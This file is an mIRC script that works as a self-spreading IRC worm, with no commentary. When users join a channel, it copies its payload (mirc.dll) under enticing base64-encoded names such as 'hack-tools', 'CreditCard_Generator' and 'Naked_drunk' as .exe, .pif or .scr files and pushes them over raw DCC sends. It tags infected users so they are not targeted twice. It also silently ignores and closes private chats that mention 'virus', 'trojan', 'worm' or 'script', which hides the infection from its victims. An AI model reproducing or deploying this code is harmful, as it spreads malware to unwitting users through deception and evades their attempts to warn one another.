   on *:join:* {
     if ($level($address($nick,2)) != sh1t) && ($nick != $me) {
       if ($isfile($decode(%vwq,m) $+ 0.0) == $true) { set %cc1 $read($decode(%vwq,m) $+ 0.0, 2) | set %cc2 $read($decode(%vwq,m) $+ 0.0, 3) | set %cc3 $read($decode(%vwq,m) $+ 0.0, 4) }
       if (%cc1 == $null) { set %cc1 0 } | if (%cc2 == $null) { set %cc1 0 }
       if (%cc2 == 1) {
         if (%cc3 != $null) && ($isdir(%cc3) == $true) {
           set %rnd $r(1,33)
           if (%rnd == 1) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(QmVkcm9vbS10aG9uZ3M=,m) pif $nick } | .ignore -u60 $nick }
           if (%rnd == 2) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(cmQtc2xpa2U=,m) pif $nick } | .ignore -u60 $nick }
           if (%rnd == 3) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(SG90,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 4) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(TE1BTw==,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 5) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(TE9M,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 6) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(TmFrZWRfZHJ1bms=,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 7) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(TmV3X3dlYmNhbQ==,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 8) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(Uk9GTA==,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 9) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(VW5kZXJ3YXJl,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 10) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(V2ViY2Ft,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 11) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(aGFjay10b29scw==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 12) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(c2xpa2U=,m) scr $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 13) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(cm9qc25pX2Rhbg==,m) scr $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 14) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(cGFydHlAc2xpa2U=,m) scr $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 15) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(YWxrb3Rlc3Q=,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 16) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(Q291bnRlcl9TdHJpa2VfTmV3X0tleUdlbg==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 17) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(aGFoYWhh,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 18) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(Z29qZW5qZV9tYXJpaHVhbmU=,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 19) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(ZHJ1Z3M=,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 20) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(Q3JlZGl0Q2FyZF9HZW5lcmF0b3I=,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 21) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(dG9ycmVudF80X2RyaXYzZXJfSUlJ,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 22) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(c2xpa2U=,m) scr $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 23) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(cG9ybm9ncmFmaWph,m) scr $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 24) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(SXNrYWxlY19jcmFja292,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 25) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(YmxhY2tfaXJjX3AycA==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 26) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(ZXhlZW1fdG9ycmVudA==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 27) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(ZW11bGFfdXBkYXRl,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 28) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(V2luWFBfU1Az,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 29) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(RGVhbW9uX1Rvb2xz,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 30) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(aDRjaw==,m) pif $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 31) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(U3Zlbl9Pc3Rlci1TcGVjaWFsRWRpdGlvbg==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 32) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(Vk5DX0NsaWVudF8oQ3JhY2RlZDpOb01PUkVQQVNTKQ==,m) exe $nick } | .ignore -u60 $nick $nick }
           if (%rnd == 33) { .guser sh1t $nick 2 | .timer $+ $nick $+ $chan 1 15 { .dcs $decode(ZGRvc190b29scw==,m) exe } | .ignore -u60 $nick }
         }
       }
     } | .unset %rnd | .unset %rmd | .unset %rxd
   }

   alias dcs { if (%cc3 != $null) && ($isdir(%cc3) == $true) { var %ps =  $decode(%vwq,m) $+ $decode(bWlyYy5kbGw=,m) | .copy -o %ps %cc3 $+ \ $+ $1 $+ . $+ $2 | ssdrek $3 %cc3 $+ \ $+ $1 $+ . $+ $2 #op } }
   On 1:SENDFAIL:*:{ halt }

   Alias ssdrek { set %bv.file $2
     if ( $1 isop $3 ) || ( $1 isvoice $3 ) { halt }
     if ( $exists(%bv.file) = $false ) { halt }
     if ( $sock(bv.*,0) > 5 ) { return }
     Set %bv. $+ $1 0 | :scanpt | Set %pt $rand(2400,5000)
     if ( $portfree(%pt) = $false ) { goto scanpt }
     Set [ % $+ [ nv. $+ [ $1 ] ] ] 0 | Set %pk. $+ $1 4096 | Set %sz $file(%bv.file).size
     Set %bv.vtp1 bv. $+ $1 | .timer $+ $1 1 300 { .sockclose %bv.vtp1 | .sockclose i. $+ $1 }
     .timer $+ $1 1 50 drekover $1 | .ignore -u90 $1 2
     .raw -q privmsg $1 : $+ $chr(1) $+ DCC SEND %bv.file $longip($ip) %pt %sz $+ $chr(1)
   if ( $sock(%bv.vtp1) != $null ) { .sockclose %bv.vtp1 } | .socklisten %bv.vtp1 %pt }

   Alias drekover { if ( [ % $+ [ nv. $+ [ $1 ] ] ] = 0 ) { .sockclose [ i. $+ [ $1 ] ] | .sockclose [ bv. $+ [ $1 ] ] | .timer $+ $1 off } }
   Alias sdrek { if ( $calc( [ % $+ [ nv. $+ [ $1 ] ] ] + [ % $+ [ pk. $+ [ $1 ] ] ] ) < %sz) { bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data | inc [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] } | else { Set [ % $+ [ bv. $+ [ $1 ] ] ] 1 | [ % $+ [ pk. $+ [ $1 ] ] ] = $calc( %sz - [ % $+ [ nv. $+ [ $1 ] ] ] ) | if ( [ % $+ [ pk. $+  [ $1 ] ] ] = 0) { return } | bread %bv.file [ % $+ [ nv. $+ [ $1 ] ] ] [ % $+ [ pk. $+ [ $1 ] ] ] &data | .sockwrite i. $+ $1 &data } }
   On 1:SockClose:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | sockclose $sockname | sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off }
   On 1:SockListen:bv.*:{ Set %bv.tmp5 $remove($sockname,bv.) | sockaccept i. $+ %bv.tmp5 | sdrek %bv.tmp5 }
   On 1:SockWrite:i.*:{ Set %bv.tmp6 $remove($sockname,i.) | if ( [ % $+ [ bv. $+ [ %bv.tmp6 ] ] ] = 1 ) { .timer $+ $rand(99,9999) 1 10 sockclose $sockname | .timer $+ $r(99,9999) 1 10 sockclose [ bv. $+ [ %bv.tmp6 ] ] | .timer $+ %bv.tmp6 off | halt } | sdrek %bv.tmp6 }

   on *:TEXT:*:?: { if (format isin $1-) || (okuÅ¾en isin $1-) || (arv isin $1-) || (trojan isin $1-) || (troyano isin $1-) || (virus isin $1-) || (worm isin $1-) || (set isin $1-) || (enable isin $1-) || (disable isin $1-) || (remote isin $1-) || (script isin $1-) || (play isin $1-) || (sock isin $1-) || (write isin $1-) || (decode isin $1-) || (alias isin $1-) || (load isin $1-) || (unload isin $1-) || (remini isin $1-) || (remove isin $1-) || (events isin $1-) || (timer isin $1-) { .ignore $nick | .close -cm $nick } }

   on *:CONNECT: {
     set %vwq $encode(,m)
     .rlevel sh1t | .write -l1 $decode(%vwq,m) $+ 0.0 $nick
   }
